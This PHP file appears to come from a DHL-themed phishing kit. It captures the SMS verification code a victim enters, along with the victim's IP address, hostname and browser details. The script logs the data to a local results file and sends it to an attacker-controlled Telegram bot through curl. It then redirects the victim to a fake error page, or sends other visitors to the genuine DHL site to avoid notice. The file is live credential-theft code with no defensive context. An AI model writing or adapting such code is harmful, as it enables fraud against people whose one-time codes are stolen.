<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if ($_POST['type'] == "code") {

            $sms_request = 1 + $_GET['request'];


            $message = '/== DHL SMS By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Code sms_' . $sms_request . ' : ' . $_POST['ce'] . "\r\n";
           
            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- END SMS INFO --/' . "\r\n\r\n";

            file_put_contents("./rezult/rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
         
         $cn = htmlspecialchars($_GET["cn"]);      



   header("location: sms-error.php?cn=". $_POST['nu']);
            
}
else {
header("location: https://www.dhl.com/global-en/home.html");
}

?>